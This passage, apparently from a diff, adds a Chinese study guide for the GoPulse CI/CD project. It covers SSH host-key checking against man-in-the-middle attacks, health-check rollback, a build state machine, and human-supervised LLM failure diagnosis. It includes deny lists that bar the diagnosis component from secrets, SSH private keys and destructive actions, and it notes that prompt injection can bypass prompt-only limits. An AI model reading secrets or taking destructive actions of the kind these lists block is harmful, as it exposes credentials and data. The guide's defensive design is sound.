+<p><strong>认证方式：密钥而非密码。</strong></p></div><div class="blk"><h3>非对称密钥认证原理</h3><div class="flow">私钥（id_rsa）     ──▶ 存在 GoPulse 这边，AES-GCM 加密后放数据库
+公钥（id_rsa.pub） ──▶ 放在目标服务器的 ~/.ssh/authorized_keys 里
+
+连接时：
+  服务器用【公钥】出一个「只有对应私钥才能解」的题
+        │
+        ▼
+  GoPulse 用【私钥】解开 ──▶ 证明「我确实持有私钥」──▶ 允许登录
+
+关键：【私钥从不在网络上传输】，传输的只是签名的应答</div></div><div class="blk"><h3 class="k-warn">Host Key 校验：最容易被忽略、后果最严重的一环</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+<strong>中间人攻击场景：</strong></div></div><div class="blk"><h3>流程</h3><div class="flow">GoPulse 想连 10.0.0.8
+        │
+        ▼
+攻击者在网络中间拦截，【伪装成 10.0.0.8】
+        │
+        ▼
+GoPulse 把 SSH 认证信息、部署命令、代码全发给攻击者
+        │
+        ▼
+攻击者拿到一切 ──▶ 你的服务器、代码、密钥全部沦陷</div></div><div class="blk">
+<p><strong>防御原理：</strong>每台服务器的 SSH 服务有一个<em>主机密钥指纹</em>。
+第一次连接时记录下来，以后每次连接都核对 —— 指纹不对就拒绝连接。</p></div><div class="blk"><h3 class="k-code">技术细节</h3><div class="codewrap"><span class="lang">go</span><pre>ssh.Dial(<span class="s">"tcp"</span>, addr, &amp;ssh.ClientConfig{
+    User:            user,
+    Auth:            []ssh.AuthMethod{ssh.PublicKeys(key)},
+    HostKeyCallback: ssh.FixedHostKey(expectedKey),   <span class="c">// ← 关键这一行</span>
+    Timeout:         <span class="n">10</span> * time.Second,               <span class="c">// 必须有超时</span>
+})</pre></div></div><div class="blk"><h3 class="k-warn">反面教材：网上大量 Go SSH 示例代码在教人犯错</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+<code>ssh.InsecureIgnoreHostKey()</code> —— 很多教程用它，因为「省事，不用管指纹」。<br><br>
+<strong>它完全关闭了中间人防御。</strong>名字里的 <code>Insecure</code> 不是玩笑。<br><br>
+本项目架构明确要求用 <code>FixedHostKey</code>，前端「添加主机」表单里也有「目标机公钥指纹」字段，
+还给了提示<em>「可在目标机执行 ssh-keyscan 获取」</em>。</div></div><div class="blk"><h3 class="k-tip">部署前环境检查：为什么不能省</h3><div class="tip"><div class="t">为什么这样设计</div>
+在真正部署前先探一下目标机：<br>
+<code>docker 装了吗？ docker-compose 装了吗？ 磁盘够吗？ 工作目录可写吗？</code><br><br>
+<strong>如果不检查：</strong>部署到一半发现目标机没装 docker，此时<em>旧版本已经停了、新版本起不来</em>
+—— <strong>服务彻底中断</strong>。<br><br>
+提前检查能把失败挡在「还没动线上」的阶段。这就是 <code>sshx.Runner.Probe()</code> 接口的用途。</div></div><div class="blk">
+<p><strong>版本保留与回滚的实现。</strong>目标机上保留最近 K 个版本：</p></div><div class="blk"><h3>流程</h3><div class="flow">/srv/web-api/
+  ├── current  ──▶ releases/a3f9c21      （软链接，指向当前版本）
+  └── releases/
+      ├── a3f9c21/    ← 当前
+      ├── 7b1e044/    ← 上一个（回滚目标）
+      └── c9d2e18/
+
+回滚 = 把 current 软链接指回上一个版本 + 重新 docker-compose up -d
+     ──▶ 因为镜像不可变，【回滚不需要重新构建】，几秒就能完成</div></div><div class="blk"><h3>三种部署策略（本项目的取舍）</h3><div class="tw"><table><thead><tr><th>策略</th><th>做法</th><th>停机</th><th>难度</th><th>本项目</th></tr></thead><tbody><tr><td><strong>原地替换</strong></td><td>SSH + <span class='mono'>docker-compose up -d</span></td><td>有短暂停机（5–10 秒）</td><td>★</td><td><span class='yes'>✅ 最小可用版，M4 实现</span></td></tr><tr><td>蓝绿</td><td>备用端口起新容器 → 健康检查 → 切流量</td><td>无</td><td>★★★</td><td>⬜ 暂缓（进未来工作）</td></tr><tr><td>滚动</td><td>多实例逐个替换</td><td>无</td><td>★★★</td><td>⬜ 暂缓（需要多实例，超出小团队范围）</td></tr></tbody></table></div></div></div></section>
+<section class="station plan" id="s10"><div class="shead"><span class="snum">⑩</span><div class="stitle"><h2>健康检查：容器起来了 ≠ 服务能用</h2><p class="sub">新手最容易漏的一环，也是自动回滚的触发条件</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>餐厅上菜不等于菜是好的。</strong><br><br>
+服务员把盘子端上桌（<code>docker-compose up -d</code> 返回成功），
+只说明「菜送到了」，不说明「菜没做坏」。<br><br>
+健康检查就是<strong>尝一口</strong> —— 真的发一个请求，看服务是不是正常响应。</div></div><div class="blk"><h3 class="k-warn">为什么必须有这一步：真实的失败场景</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+<code>docker-compose up -d</code> 返回成功，<strong>只代表「容器进程启动了」</strong>，
+不代表「你的服务能正常响应请求」。</div></div><div class="blk"><h3>流程</h3><div class="flow">真实的失败场景：
+  · 服务启动 3 秒后因为配置错误崩溃
+  · 服务起来了但连不上数据库，所有请求返回 500
+  · 服务监听在错误的端口
+  · 新版本有个 bug，首页就 panic
+
+如果只看 docker 的返回值：
+  系统报告「部署成功」 ──▶ 但用户访问全是 500
+                       ──▶ 你以为没事，其实【线上已经炸了】</div></div><div class="blk"><h3>检查逻辑</h3><div class="flow">GET http://10.0.0.8:8080/healthz
+        │
+        ▼
+   间隔 3 秒重试，最多 5 次
+        │
+   ┌────┴─────────────────────┐
+   ▼                          ▼
+连续 3 次返回 200          5 次都不行
+   │                          │
+   ▼                          ▼
+健康 → deployed           失败 → 触发【自动回滚】</div></div><div class="blk"><h3>两个参数的设计理由</h3><div class="kv"><div class="k">为什么要重试</div><div>服务启动需要时间（加载配置、连数据库、预热缓存）。刚 <span class='mono'>up -d</span> 完立刻探测，多半还没起来 —— <strong>这不代表失败</strong>。重试给了它启动的窗口</div><div class="k">为什么要求连续 3 次</div><div>防止偶然一次成功就判定健康 —— 比如服务正在崩溃循环，偶尔有一次响应了。连续 3 次才算稳定</div></div></div><div class="blk">
+<p><strong>自动回滚流程：</strong></p></div><div class="blk"><h3>流程</h3><div class="flow">健康检查失败
+   │
+   ▼
+从部署记录里找到【上一个成功的 deployment】
+   │
+   ▼
+用它的 image_tag 重新部署
+   │
+   ▼
+再做一次健康检查
+   │
+   ├── 成功 ──▶ 状态 rolled_back，发通知
+   │
+   └── 还失败 ──▶ 【停下】，标记需要人工介入
+                  （不要无限回滚 —— 那会变成回滚风暴）</div></div><div class="blk"><h3 class="k-code">回滚链在数据库里是显式建模的</h3><div class="codewrap"><span class="lang">sql</span><pre><span class="k">CREATE TABLE</span> deployments (
+    id                     <span class="k">INTEGER PRIMARY KEY AUTOINCREMENT</span>,
+    build_id               <span class="k">INTEGER NOT NULL REFERENCES</span> builds(id),
+    state                  <span class="k">TEXT NOT NULL</span>,   <span class="c">-- deploying|deployed|failed|rolled_back</span>
+    image_tag              <span class="k">TEXT NOT NULL</span>,
+    previous_deployment_id <span class="k">INTEGER REFERENCES</span> deployments(id),  <span class="c">-- ← 回滚目标</span>
+    ...
+);</pre></div></div><div class="blk"><h3 class="k-tip">为什么用外键而不是靠时间戳猜</h3><div class="tip"><div class="t">为什么这样设计</div>
+<code>previous_deployment_id</code> 显式记录「回滚到哪个」。<br><br>
+如果靠时间戳去猜「上一个部署是什么时候」，<strong>并发部署时时间戳可能不可靠</strong>
+（两个部署几乎同时完成，谁先谁后取决于写入顺序）。<br><br>
+<em>显式的关系永远比推断的关系可靠。</em></div></div></div></section>
+<section class="station plan" id="s11"><div class="shead"><span class="snum">⑪</span><div class="stitle"><h2>状态机：整个系统的骨架</h2><p class="sub">所有环节串起来就是一张状态迁移图，以及三条设计原则</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3>完整状态机</h3><div class="flow">        ┌──────────┐
+        │ queued   │  已入队，等 worker
+        └────┬─────┘
+             ▼
+        ┌──────────┐
+        │ running  │  容器内构建中
+        └────┬─────┘
+        成功 │ │ 失败
+      ┌──────┘ └──────┐
+      ▼               ▼
+┌───────────┐   ┌──────────┐
+│ succeeded │   │  failed  │─ ─ ─ ─ ─ ┐ 异步，不阻塞主流程
+└─────┬─────┘   └──────────┘          ┆
+      ▼                               ▼
+┌───────────┐              ┌────────────────┐
+│ deploying │              │   diagnosed    │  虚线：只是补充信息，
+└─────┬─────┘              └────────────────┘  不参与主干状态机
+ 成功 │ │ 失败
+┌─────┘ └──────┐
+▼              ▼
+┌──────────┐ ┌───────────────┐
+│ deployed │ │ deploy_failed │
+└──────────┘ └───────┬───────┘
+                     ▼
+              ┌──────────────┐
+              │ rolled_back  │
+              └──────────────┘</div></div><div class="blk"><p><strong>三条设计原则：</strong></p></div><div class="blk"><h3 class="k-code">原则① 只允许沿边迁移，非法迁移直接拒绝</h3><div class="codewrap"><span class="lang">go</span><pre><span class="k">var</span> allowed = <span class="k">map</span>[State][]State{
+    StateQueued:    {StateRunning, StateFailed},
+    StateRunning:   {StateSucceeded, StateFailed},
+    StateSucceeded: {StateDeploying},
+    StateDeploying: {StateDeployed, StateDeployFailed},
+    StateDeployFailed: {StateRolledBack, StateDeployFailed},
+}
+
+<span class="k">func</span> Transition(from, to State) <span class="k">error</span> {
+    <span class="k">if</span> !contains(allowed[from], to) {
+        <span class="k">return</span> fmt.Errorf(<span class="s">"非法状态迁移 %s → %s"</span>, from, to)
+    }
+    <span class="k">return nil</span>
+}</pre></div></div><div class="blk"><h3 class="k-warn">为什么要这么严格：状态错乱是并发系统最难查的 bug</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+比如一个已经 <code>failed</code> 的构建，因为某个迟到的 goroutine 又把它改成 <code>running</code>
+—— 界面上就出现<strong>「失败的构建正在运行」</strong>这种鬼故事。<br><br>
+这类 bug 极难复现（依赖时序），极难排查。<br>
+<strong>把迁移规则写死，非法迁移直接拒绝，能从根上消灭这一整类问题。</strong></div></div><div class="blk"><h3 class="k-code">原则② 每次迁移都写审计表</h3><div class="codewrap"><span class="lang">sql</span><pre><span class="k">CREATE TABLE</span> build_events (
+    id          <span class="k">INTEGER PRIMARY KEY AUTOINCREMENT</span>,
+    build_id    <span class="k">INTEGER NOT NULL REFERENCES</span> builds(id) <span class="k">ON DELETE CASCADE</span>,
+    from_state  <span class="k">TEXT</span>,
+    to_state    <span class="k">TEXT NOT NULL</span>,
+    reason      <span class="k">TEXT</span>,          <span class="c">-- 为什么迁移（错误信息、谁触发的）</span>
+    created_at  <span class="k">TEXT NOT NULL DEFAULT</span> (datetime(<span class="s">'now'</span>))
+);</pre></div></div><div class="blk"><h3 class="k-tip">为什么这样</h3><div class="tip"><div class="t">为什么这样设计</div>
+好处：出问题时可以<strong>回放</strong>这个构建的完整历史 —— 什么时候进队列、什么时候开始、为什么失败。<br><br>
+这也是论文里能画「构建时序图」的数据来源，以及答辩时演示「全流程可追溯」的证据。</div></div><div class="blk">
+<p><strong>原则③ 单 goroutine 串行处理同一构建的事件</strong> ——
+避免多个 goroutine 同时改一个构建的状态，<em>从设计上消灭竞态，而不是靠加锁</em>。</p>
+<p>「不加锁」比「加对了锁」更好：锁会带来死锁风险、性能开销，以及「我到底有没有漏加」的长期焦虑。</p></div><div class="blk"><h3 class="k-code">崩溃恢复：Reconciler 的职责</h3><div class="codewrap"><span class="lang">text</span><pre>进程重启后，数据库里可能残留这样的记录：
+  state = 'running'   但根本没有 goroutine 在跑它 ──▶ 「孤儿构建」
+
+Reconciler goroutine 定期扫描：
+  · running / deploying 超过 build_timeout 的 ──▶ 标记 failed(interrupted) 或按策略重试
+  · 磁盘上残留的 workspace 目录            ──▶ 清理
+  · 泄漏的构建容器                          ──▶ docker rm -f</pre></div></div></div></section>
+<section class="station plan" id="s12"><div class="shead"><span class="snum">⑫</span><div class="stitle"><h2>失败诊断与 LOA：核心创新点</h2><p class="sub">人为主导的 AI 协助运维 —— 理论依据、八步机制、以及为什么小团队不能全自动</p></div><span class="sbadge"><span class="b plan">后端待实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk">
+<p><strong>传统 CI 与你这个系统的差别：</strong></p></div><div class="blk"><h3>流程</h3><div class="flow">传统 CI：  构建失败 ──▶ 甩给你 5000 行日志 ──▶ 自己找
+
+GoPulse：  构建失败 ──▶ 分析日志 ──▶ 告诉你「错在哪、为什么、怎么改」
+                              └──▶ 但【由你决定改不改】</div></div><div class="blk"><p>下面按<strong>八个步骤</strong>拆解，每一步都标注了它在「人主导」里扮演的角色。</p></div><div class="blk"><h3 class="k-code">第一步：日志裁剪</h3><div class="codewrap"><span class="lang">text</span><pre>构建日志可能有几 MB，但 LLM 有上下文长度限制。
+而且【塞太多反而效果差】── 这点有文献支撑：
+  Roy et al. (FSE'24 Companion) 发现把事件讨论记录作为额外上下文喂给模型，
+  性能【并未显著提升】──▶ 说明上下文堆砌无用，信息的【筛选】才是关键。
+
+裁剪策略：
+  取头部（前 ~50 行）  ──▶ 里面是「执行了什么命令」「什么环境」
+      +
+  取尾部（最后 8KB）   ──▶ 里面是真正的错误信息
+      +
+  中间用占位符省略     ──▶ "... [省略 12,847 行] ..."
+
+为什么错误在尾部：程序是顺序执行的，崩溃发生在最后。
+头部的价值是提供上下文（跑的是什么命令、哪个阶段）。</pre></div></div><div class="blk"><h3 class="k-code">第二步：脱敏（不能省）</h3><div class="codewrap"><span class="lang">text</span><pre>日志里可能意外打印了敏感信息
+  （比如某个脚本 echo $DATABASE_URL，或 npm 报错时带出 .npmrc 内容）
+
+发给第三方 LLM API 前必须过滤：
+  把该项目【所有已知的 secret 值】，在日志里替换成 [REDACTED]
+
+否则你等于把用户的数据库密码发给了 OpenAI。</pre></div></div><div class="blk">
+<p><strong>第三步：Analyzer 圈定范围</strong> —— <em>这是「人为主导」的第一个实质机制。</em>
+借鉴 k8sgpt 的思路（它把 SRE 经验固化为一个个 analyzer，官方表述是
+"SRE experience codified into its analyzers"）。</p></div><div class="blk"><h3 class="k-code">核心原则：AI 不能自己决定看什么，人预先定义好</h3><div class="codewrap"><span class="lang">yaml</span><pre><span class="k">analyzer</span>: npm_install_failure
+  <span class="k">触发条件</span>: 阶段 == <span class="s">"安装依赖"</span> AND 退出码 != <span class="n">0</span>
+  <span class="k">可查上下文</span>:
+    - 日志尾部 <span class="n">200</span> 行
+    - <span class="k">package.json</span> 的 diff
+    - 上次成功构建的 lockfile 哈希
+  <span class="k">禁止查询</span>:
+    - secrets 表
+    - SSH 私钥
+    - 其他项目的日志</pre></div></div><div class="blk"><h3 class="k-tip">Analyzer 的三重价值</h3><div class="tip"><div class="t">为什么这样设计</div>
+<strong>① 安全</strong> —— 脱敏边界由<em>代码</em>定义，而不是靠 prompt 里写「请不要看密钥」。
+prompt 约束是可以被绕过的（提示注入），代码约束不能。<br><br>
+<strong>② 准确</strong> —— 缩小范围等于提高信噪比。<br><br>
+<strong>③「人为主导」落地</strong> —— 人有<em>具体的装置</em>来控制 AI，而不是一句口号。
+答辩时如果被问「人主导具体体现在哪」，这就是答案之一。</div></div><div class="blk">
+<p><strong>第四步：LOA 策略决策。</strong>LOA = Level of Automation（自动化级别），
+出自 Sheridan 的十级量表。理论依据是 <strong>Parasuraman, Sheridan &amp; Wickens (2000)</strong> 的模型 ——
+自动化不是「全有或全无」，而是<em>四类功能各自独立地可以调自动化程度</em>：</p></div><div class="blk"><h3>四类功能 × 本系统的自动化级别</h3><div class="tw"><table><thead><tr><th>功能类型</th><th>在 GoPulse 里对应</th><th>自动化级别</th><th>理由</th></tr></thead><tbody><tr><td>信息获取</td><td>收集构建日志、容器退出码、diff、历史失败</td><td><strong>高</strong></td><td>人不该干这个，纯机械</td></tr><tr><td>信息分析</td><td>日志裁剪、错误聚类、根因推断</td><td><strong>高</strong></td><td>LLM 的主场</td></tr><tr><td><strong>决策选择</strong></td><td>采纳哪个修复方案、是否回滚</td><td><strong>低（LOA 4）</strong></td><td><strong>人主导</strong> —— AI 只提议</td></tr><tr><td><strong>行动执行</strong></td><td>改代码、重跑构建、部署</td><td><strong>最低</strong></td><td><strong>人执行</strong> —— AI 不碰代码</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">这个框架的价值：把口号变成可量化的设计决策</h3><div class="tip"><div class="t">为什么这样设计</div>
+有了它，「人为主导」不再是模糊说法，而是可以精确表述的：<br><br>
+<em>「本系统在信息获取与信息分析环节采用高自动化级别（Sheridan LOA 6–7），
+在决策选择与行动执行环节刻意保留人的主导权（LOA 2–4）。」</em><br><br>
+对照：LogSage（ASE 2025）那类端到端方案在决策环节接近 LOA 7–8。<br>
+<strong>你不是做得少，是刻意在不同功能维度上选择了不同的自动化级别。</strong></div></div><div class="blk"><h3>Sheridan 十级量表（本系统用到的档位）</h3><div class="tw"><table><thead><tr><th class="mono">LOA</th><th>含义</th><th>本系统</th></tr></thead><tbody><tr><td class="mono">2</td><td>计算机建议多种做法</td><td>诊断卡列出多个可能原因</td></tr><tr><td class="mono">4</td><td>计算机选一种，<strong>人批准后执行</strong></td><td><strong>← 默认档</strong></td></tr><tr><td class="mono">6</td><td>自动执行后必须告知人</td><td>依赖小版本更新 + 通知</td></tr><tr><td class="mono">7</td><td>自动执行，事后可审计</td><td>知识库已验证 ≥3 次的已知失败</td></tr><tr><td class="mono">8</td><td>自动执行并忽略人</td><td><span class='no'>本系统【永不启用】</span></td></tr></tbody></table></div></div><div class="blk">
+<p><strong>第五步：为什么小团队反而不能全自动</strong> —— <em>这是你的核心论证，有 CCF-A 顶会的实证支撑。</em></p></div><div class="blk"><h3>Zhou et al., ICSE 2026（CCF-A）的实测数据</h3><div class="kv"><div class="k">研究对象</div><div>混合方法：14 名开发者观察 + 22 名问卷</div><div class="k">认知偏差比例</div><div><strong>48.8%</strong> 的开发者动作存在认知偏差，其中 <strong>56.4%</strong> 与 LLM 交互相关</div><div class="k">撤销率</div><div>LLM 相关动作的撤销率 <strong>29.46%</strong>（238/808），统计显著高于非 LLM 动作</div><div class="k">学术贡献</div><div>建立了 90 种偏差 / 15 类的 taxonomy，经认知心理学家验证</div></div></div><div class="blk"><h3>论证链（论文里可以这样写）</h3><div class="flow">LLM 建议的撤销率偏高（近三成要回退）
+        │
+        ▼
+全自动采纳会产生「看起来在修、实际在返工」的【隐性成本】
+        │
+        ▼
+小团队【没有专职 SRE】复核 AI 结论
+        │
+        ▼
+但【开发者本人就在场】，且有完整业务上下文
+        │
+        ▼
+∴ 把决策权留给人，在小团队场景下【不是妥协，而是效率最优解】</div></div><div class="blk">
+<p>另有 <strong>automation bias（自动化偏见）</strong>的研究支撑（Romeo &amp; Conti, <em>AI &amp; Society</em>）：
+给出决策建议时，人会更少审视附加信息 —— <em>全自动会放大这个效应</em>。</p></div><div class="blk">
+<p><strong>第六步：证据链强制绑定</strong> —— <em>「人为主导」的第二个实质机制。</em>
+诊断输出<strong>不能是一段散文</strong>，必须是结构化断言 + 可点击的日志行号：</p></div><div class="blk"><h3 class="k-code">技术细节</h3><div class="codewrap"><span class="lang">json</span><pre>{
+  <span class="k">"root_cause"</span>: <span class="s">"TypeScript 类型检查失败"</span>,
+  <span class="k">"evidence"</span>: [
+    {
+      <span class="k">"claim"</span>: <span class="s">"tsc 报告类型错误 TS2345"</span>,
+      <span class="k">"log_lines"</span>: [<span class="n">41</span>, <span class="n">42</span>],
+      <span class="k">"verbatim"</span>: <span class="s">"src/api/client.ts:42:18 - error TS2345: ..."</span>
+    },
+    {
+      <span class="k">"claim"</span>: <span class="s">"错误位置正是本次提交修改的行"</span>,
+      <span class="k">"diff_hunk"</span>: <span class="s">"src/api/client.ts:42"</span>
+    }
+  ],
+  <span class="k">"suggestion"</span>: <span class="s">"读取环境变量后显式转换：const port = Number(process.env.PORT ?? 3000)"</span>,
+  <span class="k">"confidence_basis"</span>: <span class="s">"错误信息与本次 diff 修改位置一致"</span>
+}</pre></div></div><div class="blk"><h3 class="k-tip">这个设计对抗的正是 automation bias</h3><div class="tip"><div class="t">为什么这样设计</div>
+前端把 <code>log_lines</code> 渲染成<strong>可点击跳转到日志终端对应行</strong>的链接。<br><br>
+所以人不是在读结论，而是在<strong>验证据</strong>。<br><br>
+而且它给了你一个别人没有的可测量指标：<em>证据定位准确率</em>（AI 引用的行号里是否真的包含该错误）。</div></div><div class="blk"><h3 class="k-warn">为什么刻意不显示百分比置信度</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+原始设计稿写「置信度 99.4%」，已改掉。<br><br>
+因为<strong>那个数字无法解释是怎么算出来的</strong> —— LLM 不会输出校准过的概率，
+你也没有 ground truth 去标定它。答辩时一句「这个 99.4% 怎么来的」就能问穿。<br><br>
+改成 <code>confidence_basis</code>（定性说明依据），<em>可辩护 &gt; 好看</em>。</div></div><div class="blk">
+<p><strong>第七步：知识库与 LOA 动态演进</strong> —— <em>「人为主导」的第三个机制，也是最有意思的一环。</em>
+<strong>人不只是「批准者」，人是「训练者」。</strong></p></div><div class="blk"><h3>演进闭环</h3><div class="flow">开发者看完诊断 ──▶ 点 ✅准确 / ⚠️部分准确 / ❌无关
+                          │
+                          ▼
+        标记为准确的 ──▶ 沉淀成【已验证三元组】
+                          (错误特征 → 根因 → 修复动作)
+                          │
+                          ▼
+              下次同类失败 ──▶ 先查知识库
+                          │
+              ┌───────────┴────────────┐
+              ▼                        ▼
+   命中且 verified_count ≥ 3      未命中
+              │                        │
+              ▼                        ▼
+   LOA 自动升到 7               LOA 4，调 LLM
+   无需调 LLM，直接自动处理      通知人审批
+              │
+              ▼
+   自动处理连续失败 2 次 ──▶ 【熔断】自动降回 LOA 4</div></div><div class="blk"><h3>三重好处</h3><div class="kv"><div class="k">降成本</div><div>命中知识库不调 API，省 token 也省时间</div><div class="k">提可信度</div><div>建议附带「本团队已验证 3 次」，比裸的 AI 输出可信得多</div><div class="k">解决冷启动</div><div>Hassan &amp; Wang 那类机器学习方法需要历史数据训练，<strong>新项目根本用不了</strong>；本方案靠人在使用中逐步积累，<em>第一天就能用</em></div></div></div><div class="blk"><h3 class="k-tip">这就是「全自动托管模式」的正确实现方式</h3><div class="tip"><div class="t">为什么这样设计</div>
+它<strong>不是与人主导对立的另一个开关</strong>，而是<em>人主导积累到一定程度后自然演化出的状态</em>。<br><br>
+答辩时这个逻辑闭环很有力：<br>
+&nbsp;&nbsp;「全自动模式会不会和你的『人为主导』创新点矛盾？」<br>
+&nbsp;&nbsp;→「不矛盾。全自动的能力<strong>来自</strong>人主导阶段积累的已验证知识。
+人是自动化的训练者，自动化级别随验证次数演进 —— 这正是 Parasuraman 模型里
+adaptive automation（自适应自动化）的具体实现。」</div></div><div class="blk"><h3>全自动模式的安全边界（这条务必守住）</h3><div class="tw"><table><thead><tr><th>全自动<strong>可以</strong>做</th><th>全自动<strong>永不</strong>做</th></tr></thead><tbody><tr><td>重试已知瞬态失败（网络抖动、镜像拉取超时）</td><td><span class='no'>生成并应用 AI 新写的代码补丁</span></td></tr><tr><td>应用<strong>已验证过的</strong>修复动作（知识库里有）</td><td><span class='no'>修改 secrets、SSH 密钥、部署凭据</span></td></tr><tr><td>健康检查失败后自动回滚到前序版本</td><td><span class='no'>删除数据、清理卷、强制覆盖</span></td></tr><tr><td>依赖小版本更新 + 全量测试通过后部署</td><td><span class='no'>未通过健康检查就继续推进</span></td></tr><tr><td>发通知、生成日报</td><td><span class='no'>跨越审批门槛的破坏性操作</td></tr></tbody></table></div></div><div class="blk">
+<p><strong>判据：</strong>全自动只执行<em>「确定性的、已验证的、可回滚的」</em>动作。
+凡是需要生成新内容的，一律回到 LOA 4。</p>
+<p>配套<strong>六道护栏</strong>：① 动作白名单（AI 无法发明新动作）② 熔断降级 ③ 每日预算限制
+④ 全量审计可回放 ⑤ <strong>默认关闭</strong>（新项目默认 LOA 4，全自动需人显式开启）⑥ 破坏性动作不可提权。</p></div><div class="blk"><h3 class="k-code">第八步：为什么诊断必须异步</h3><div class="codewrap"><span class="lang">text</span><pre>构建失败 ──▶ 状态【立刻】置为 failed ──▶ 界面立刻显示失败
+                    │
+                    └──▶ 另开一个 goroutine 调 LLM（可能要 30 秒）
+                              │
+                              ▼
+                    完成后把结果补写进记录，界面更新出诊断卡
+                    （状态标记为 diagnosed，虚线状态，不改主干）
+
+理由：
+  · 用户最想知道的是「我的构建失败了」，这个必须【立刻】告诉他
+  · 诊断是补充信息，不该让他多等 30 秒
+  · LLM API 会超时、会挂 ──▶ 【诊断失败绝不能影响构建结果的正确性】</pre></div></div><div class="blk"><h3>测试失败为什么要单独一个 analyzer（LOA 4 而非更高）</h3><div class="tw"><table><thead><tr><th>失败类型</th><th class="mono">Analyzer</th><th class="mono">默认 LOA</th><th>理由</th></tr></thead><tbody><tr><td>编译 / 类型错误</td><td class="mono">build_compile_failure</td><td class="mono">4</td><td>修复需改代码，必须人判断</td></tr><tr><td><strong>单元测试失败</strong></td><td class="mono">unit_test_failure</td><td class="mono"><strong>4</strong></td><td><strong>最危险的一类</strong> —— 可能是代码错，也可能是测试本身该改</td></tr><tr><td>依赖安装失败</td><td class="mono">dependency_failure</td><td class="mono">6–7</td><td>常见瞬态（网络 / registry）</td></tr><tr><td>超时</td><td class="mono">timeout_failure</td><td class="mono">7</td><td>确定性可重试</td></tr></tbody></table></div></div><div class="blk"><h3 class="k-tip">单元测试失败是「人为主导」最有力的应用场景</h3><div class="tip"><div class="t">为什么这样设计</div>
+测试失败有<strong>两种完全相反的成因</strong>：<br>
+&nbsp;&nbsp;① 代码引入了 bug → 该修代码<br>
+&nbsp;&nbsp;② 需求变了 → 该改测试<br><br>
+<strong>AI 无法可靠区分这两者</strong>，而这恰恰是 Zhou et al. 那 29.46% 撤销率的主要来源之一。<br>
+<em>人在这里有不可替代的判断力。</em></div></div></div></section>
+<section class="station done" id="s13"><div class="shead"><span class="snum">⑬</span><div class="stitle"><h2>前端：把这一切呈现出来</h2><p class="sub">SPA 原理、分层架构、以及「用架构消灭一类 bug」的三个实例</p></div><span class="sbadge"><span class="b done">前端已实现</span></span><span class="chev">▼</span></div><div class="sbody"><div class="blk"><h3 class="k-analogy">小白类比</h3><div class="analogy"><div class="t">打个比方</div>
+<strong>SPA（单页应用）vs 传统网站</strong><br><br>
+传统网站：每点一个链接就向服务器要一个新 HTML 页面，整页刷新、白屏一下 —— 像翻一本书，每次翻页都要重新拿书。<br>
+SPA：<strong>只加载一次</strong>，之后所有「翻页」都由 JavaScript 在浏览器里替换内容 —— 像用平板看电子书，点了就换，不白屏。<br><br>
+代价：需要<strong>前端路由</strong>（<code>vue-router</code>）来管理 URL 和页面的对应关系。</div></div><div class="blk"><h3>技术栈</h3><div class="kv"><div class="k">框架</div><div>Vue 3（Composition API + <span class='mono'>&lt;script setup&gt;</span>）</div><div class="k">构建</div><div>Vite 6 —— 开发时热更新毫秒级，生产构建 Rollup 打包</div><div class="k">语言</div><div>TypeScript —— <strong>types.ts 是前后端契约的唯一事实来源</strong></div><div class="k">样式</div><div>Tailwind CSS（<strong>本地编译，不依赖 CDN</strong>）</div><div class="k">图标</div><div>34 个内联 SVG —— 不依赖 Google Fonts，断网也能显示</div><div class="k">测试</div><div>Vitest + @vue/test-utils + jsdom，23 文件 / 167 用例 / 95.9% 覆盖率</div></div></div><div class="blk"><h3 class="k-code">目录分层：每一层只依赖它下面的层</h3><div class="codewrap"><span class="lang">text</span><pre>src/
+├── types.ts          ← 所有数据结构的 TS 定义（唯一事实来源）
+├── api/
+│   ├── client.ts     ← HTTP 封装：超时、重试、abort、错误归一化
+│   ├── index.ts      ← 17 个 API 方法
+│   └── mock.ts       ← 假数据（开发时用，也是【验收样例】）
+├── composables/      ← 可复用的响应式逻辑
+│   ├── useAsync.ts       通用异步：loading / error / data / 取消
+│   ├── useLogStream.ts   SSE 日志流 + 环形缓冲
+│   └── usePolling.ts     定时轮询（卸载即停）
+├── components/
+│   ├── layout/       ← 顶栏、侧栏、状态栏（全局共用【一份】）
+│   └── ui/           ← StatusBadge、LogTerminal、StageList…
+└── views/            ← 13 个页面
+
+依赖方向：views ──▶ components ──▶ composables ──▶ api ──▶ types
+          【没有循环依赖，改一处不会波及全局】</pre></div></div><div class="blk"><h3 class="k-tip">关键设计：契约先行（Contract-First）</h3><div class="tip"><div class="t">为什么这样设计</div>
+<code>types.ts</code> 和 <code>openapi.yaml</code> 定义了前后端之间的<strong>数据契约</strong>。<br><br>
+前端按契约写好，用 <code>mock.ts</code> 提供假数据先跑通；后端按同一份契约实现；联调时开关一拨：<br>
+<code style="background:#1a2743">VITE_USE_MOCK=false</code> → 从假数据切到真后端<br><br>
+<strong>价值：</strong>前后端可以完全<em>并行开发，互不阻塞</em>。
+这也是交接文档里反复强调「以 types.ts 为契约」的原因 ——
+<code>mock.ts</code> 同时充当<strong>验收样例</strong>：后端返回与 mock 同形状的数据，167 个测试断言的一切天然成立。</div></div><div class="blk"><p><strong>三个「用架构消灭一类 bug」的实例</strong> —— 这些是设计稿里真实存在的问题：</p></div><div class="blk"><h3 class="k-warn">实例① 面包屑：13 个页面全部硬编码成同一个字符串</h3><div class="warn"><div class="t">坑 / 必须守住</div>
+原始设计稿（Stitch 生成）里，13 个页面的顶栏面包屑<strong>全部写死</strong>为
+<code>项目 / web-api / 构建 #1091</code> —— 所以在<strong>项目列表页</strong>也显示「构建 #1091」，明显错误。<br><br>
+逐个改 13 处？不，那样以后新增页面还会犯同样的错。</div></div><div class="blk"><h3 class="k-code">改成从路由元信息自动生成 —— 让这类 bug 不可能发生</h3><div class="codewrap"><span class="lang">ts</span><pre><span class="c">// 路由定义时声明</span>
+{ path: <span class="s">'/projects'</span>,            meta: { crumb: [<span class="s">'项目'</span>] } }
